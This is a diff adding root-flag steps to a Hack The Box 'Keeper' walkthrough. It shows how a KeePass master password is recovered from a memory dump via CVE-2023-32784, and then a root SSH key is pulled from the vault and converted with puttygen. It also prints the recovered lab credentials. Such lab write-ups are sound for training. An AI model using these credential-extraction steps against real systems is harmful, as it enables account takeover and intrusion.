@@ -278,9 +278,36 @@ curl -i -s -k -X $'POST' \
 
 ### Root flag
 - ls
+- unzip RT30000.zip
     ![](https://hackmd.io/_uploads/SyHncvj23.png)
+    - passcodes.kdbx
     - KeePassDumpFull.dmp
-        - there is a CVE foor KeePassDump from 2023
+        - there is a CVE for KeePassDump from 2023 - obtaining PW from Linux memory dump
             - [Exploit to obtain PW from dmp](https://sysdig.com/blog/keepass-cve-2023-32784-detection/)
             - [PoC](https://github.com/vdohney/keepass-password-dumper)
-- [pokracovani](https://github.com/rouvinerh/Gitbook/blob/main/writeups/htb-season-2/keeper.md)
+            - [keepdump-master-key](https://github.com/CMEPW/keepass-dump-masterkey)
+            - [keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper)
+- copy files from SSH to your local
+    - sudo scp lnorgaard@10.10.11.227:KeePassDumpFull.dmp <local_path>
+    - sudo scp lnorgaard@10.10.11.227:passcodes.kdbx <local_path>
+- clone [keepdump-master-key](https://github.com/CMEPW/keepass-dump-masterkey) and run it
+    - sudo python3 poc.py -d ~/HTB/SeasonII/Keeper/KeePassDumpFull.dmp
+        - Possible password: ...
+            ![](https://hackmd.io/_uploads/ByDUHS7an.png)
+            - little bit or googling
+                - `rødgrød med fløde` (dannish dessert)
+                    - open the keepass and insert this as a master pw
+                        ![](https://hackmd.io/_uploads/SkApLHmTn.png)
+- obtaining root access
+    ![](https://hackmd.io/_uploads/SJjTcHXT3.png)
+    - in Keepass, there is User named "root", PW is `F4><3K0nd!`
+        - but the root PW doesnt work...
+        - it is a putty user key file with fake PW...we can convert it back to an ssh key
+            - lets use `puttygen` to convert ppk file into a pem file
+            - copy notes to a file -> `keeper.txt`
+                - `puttygen keeper.txt -0 private-openssh -0 id_rsa`
+                    - note: you have to have version newer than 0.75
+    - access ssh
+        - ssh -i htb.pem root@keeper.htb
+
+rødgrød med fløde 
